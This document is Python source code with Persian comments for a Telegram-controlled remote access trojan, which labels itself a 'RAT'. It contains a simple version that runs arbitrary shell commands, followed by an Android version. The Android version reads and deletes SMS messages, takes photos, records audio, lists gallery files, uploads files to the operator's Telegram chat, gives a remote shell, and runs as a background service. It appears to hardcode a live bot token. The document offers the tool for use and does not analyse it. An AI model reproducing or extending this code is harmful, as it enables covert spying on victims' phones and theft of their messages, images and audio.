import telebot
import os
import subprocess

# توکن رباتت رو اینجا بذار
TOKEN = "توکن_ربات_تو_اینجا"
bot = telebot.TeleBot(TOKEN)

# آیدی چت تلگرام تو (برای امنیت که فقط خودت بتونی دستور بفرستی)
ALLOWED_CHAT_ID = تو_اینجا_آیدی_چتت_رو_بذار  # برای گرفتن.chat_id یه پیام به ربات بفرست و تو خروجی ببینش

# تابع برای اجرای دستورات سیستم
def run_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode('utf-8')
    except Exception as e:
        return str(e)

# هندل کردن پیام‌ها
@bot.message_handler(func=lambda message: message.chat.id == ALLOWED_CHAT_ID)
def handle_message(message):
    command = message.text.strip()

    if command == "/start":
        bot.reply_to(message, "RAT آماده‌ست! دستور بده.")
    elif command == "/info":
        info = os.uname() if os.name == 'posix' else os.environ['COMPUTERNAME']
        bot.reply_to(message, f"سیستم: {info}")
    else:
        # اجرای دستورات دلخواه
        result = run_command(command)
        bot.reply_to(message, result if result else "دستور اجرا شد ولی خروجی نداشت.")

# اجرای ربات
bot.polling()












import telebot
import os
import time
from plyer import storagepath, camera, audio
from kivy.utils import platform
from jnius import autoclass
from cryptography.fernet import Fernet
import subprocess
import threading

TOKEN = "7730510001:AAGsSnOYfgM_NHYN4Ppp67BPeUD2fkEjHOY"  # توکن ربات تلگرامت رو اینجا بذار
bot = telebot.TeleBot(TOKEN)
ALLOWED_CHAT_ID = 123456789  # Chat ID خودت رو بعداً جایگزین کن

key = Fernet.generate_key()
cipher = Fernet(key)

if platform == 'android':
    Context = autoclass('android.content.Context')
    SmsManager = autoclass('android.telephony.SmsManager')
    Telephony = autoclass('android.provider.Telephony')
    Environment = autoclass('android.os.Environment')
    PythonActivity = autoclass('org.kivy.android.PythonActivity')

def encrypt_data(data):
    return cipher.encrypt(data.encode())

def decrypt_data(data):
    return cipher.decrypt(data).decode()

def get_gallery_files():
    gallery_path = storagepath.get_pictures_dir()
    files = os.listdir(gallery_path)
    return files

def read_sms():
    content_resolver = PythonActivity.mActivity.getContentResolver()
    uri = Telephony.Sms.Inbox.CONTENT_URI
    cursor = content_resolver.query(uri, None, None, None, None)
    messages = []
    while cursor.moveToNext():
        msg_id = cursor.getString(cursor.getColumnIndexOrThrow("_id"))
        sender = cursor.getString(cursor.getColumnIndexOrThrow("address"))
        body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
        messages.append(f"ID: {msg_id} - فرستنده: {sender} - پیام: {body}")
    cursor.close()
    return "\n".join(messages) if messages else "پیامی پیدا نشد"

def delete_sms(message_id):
    content_resolver = PythonActivity.mActivity.getContentResolver()
    uri = Telephony.Sms.CONTENT_URI
    content_resolver.delete(uri.buildUpon().appendPath(str(message_id)).build(), None, None)
    return "پیام حذف شد"

def take_photo():
    file_path = os.path.join(storagepath.get_pictures_dir(), f"photo_{int(time.time())}.jpg")
    camera.take_picture(filename=file_path)
    return file_path

def record_audio(duration=10):
    file_path = os.path.join(storagepath.get_music_dir(), f"audio_{int(time.time())}.wav")
    audio.start_recording(file_path)
    time.sleep(duration)
    audio.stop_recording()
    return file_path

def upload_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            bot.send_document(ALLOWED_CHAT_ID, f)
        return "فایل ارسال شد"
    return "فایل پیدا نشد"

def run_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode('utf-8')
    except Exception as e:
        return str(e)

def start_background():
    if platform == 'android':
        service = autoclass('org.kivy.android.PythonService')
        mActivity = PythonActivity.mActivity
        service.start(mActivity, 'RATService')
        return "در پس‌زمینه اجرا شد"
    return "فقط روی اندروید کار می‌کنه"

@bot.message_handler(func=lambda message: message.chat.id == ALLOWED_CHAT_ID)
def handle_message(message):
    raw_command = message.text.strip()
    command = decrypt_data(encrypt_data(raw_command))

    if command == "/start":
        bot.reply_to(message, "RAT قدرتمند آماده‌ست!")
    elif command == "/gallery":
        files = get_gallery_files()
        bot.reply_to(message, "فایل‌های گالری:\n" + "\n".join(files[:10]))
    elif command == "/sms":
        sms = read_sms()
        bot.reply_to(message, sms)
    elif command.startswith("/delete_sms"):
        try:
            msg_id = command.split()[1]
            result = delete_sms(msg_id)
            bot.reply_to(message, result)
        except Exception as e:
            bot.reply_to(message, f"خطا: {str(e)}")
    elif command == "/photo":
        file_path = take_photo()
        upload_file(file_path)
    elif command.startswith("/audio"):
        try:
            duration = int(command.split()[1])
            file_path = record_audio(duration)
            upload_file(file_path)
        except:
            file_path = record_audio()
            upload_file(file_path)
    elif command.startswith("/upload"):
        file_path = command.split(maxsplit=1)[1]
        result = upload_file(file_path)
        bot.reply_to(message, result)
    elif command.startswith("/shell"):
        cmd = command.split(maxsplit=1)[1]
        result = run_command(cmd)
        bot.reply_to(message, result if result else "دستور اجرا شد")
    elif command == "/background":
        result = start_background()
        bot.reply_to(message, result)
    else:
        bot.reply_to(message, "دستور نامعتبر")

def run_at_boot():
    if platform == 'android':
        start_background()
    threading.Thread(target=main, daemon=True).start()

def main():
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"خطا: {e}")
            time.sleep(5)

if __name__ == "__main__":
    run_at_boot()
